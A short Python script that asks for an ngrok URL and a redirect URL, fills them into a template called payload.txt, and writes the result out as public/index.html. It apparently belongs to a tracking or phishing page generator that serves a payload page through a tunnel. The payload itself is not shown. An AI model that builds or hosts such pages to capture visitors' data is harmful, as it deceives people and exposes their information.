
ngrok_url = input("Ngrok url: ")
redirect_url = input("Redirect url: ")

f = open('payload.txt', 'r')
text = f.read()
f.close()

text = text.replace("ngrok_url", ngrok_url)
text = text.replace("redirect_url", redirect_url)

f = open('public/index.html', 'w')
f.write(text)
f.close()

print("Done")
